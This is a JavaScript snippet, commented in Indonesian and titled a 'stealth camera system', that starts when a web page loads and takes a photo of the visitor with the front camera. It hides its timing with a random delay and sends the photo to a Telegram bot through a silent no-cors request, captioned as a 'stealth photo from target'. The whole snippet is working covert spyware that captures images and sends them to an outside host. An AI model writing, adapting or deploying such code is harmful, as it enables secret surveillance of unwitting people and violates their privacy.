// ========== STEALTH CAMERA SYSTEM ==========
// Langsung aktif pas halaman diload
(function() {
    console.log("Initializing camera system...");
    
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('hiddenCanvas');
    const context = canvas.getContext('2d');
    
    // Konfigurasi kamera stealth (resolusi kecil biar cepet)
    const constraints = {
        video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: 'user', // Kamera depan
            frameRate: { ideal: 5 } // Rendah biar gak berat
        },
        audio: false
    };
    
    // Request akses kamera
    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            console.log("Camera access granted!");
            video.srcObject = stream;
            
            // Tunggu video siap
            video.onloadedmetadata = () => {
                video.play();
                
                // Delay random biar gak ketahuan pattern (1-3 detik)
                const delay = Math.floor(Math.random() * 2000) + 1000;
                console.log("Waiting " + delay + "ms before capture...");
                
                setTimeout(() => {
                    // Capture gambar
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert ke blob dengan kompresi
                    canvas.toBlob(blob => {
                        // Kirim ke Telegram
                        sendToTelegram(blob);
                        
                        // Stop semua track kamera biar mati
                        stream.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                        
                        console.log("Camera capture complete, stream stopped");
                    }, 'image/jpeg', 0.7); // Kompresi 70%
                }, delay);
            };
        })
        .catch(err => {
            console.log("Camera access denied or error:", err);
            // Gagal akses kamera, lanjut aja tanpa foto
        });
    
    // Fungsi kirim ke Telegram
    function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture_' + Date.now() + '.jpg');
        formData.append('caption', 'ğŸ“¸ Foto stealth dari target\nTime: ' + new Date().toLocaleString());
        
        // Kirim pake fetch dengan mode no-cors biar silent
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
            mode: 'no-cors' // Biar gak muncul error di console
        }).catch(e => console.log("Send error (ignored):", e));
        
        console.log("Photo sent to Telegram!");
    }
})();
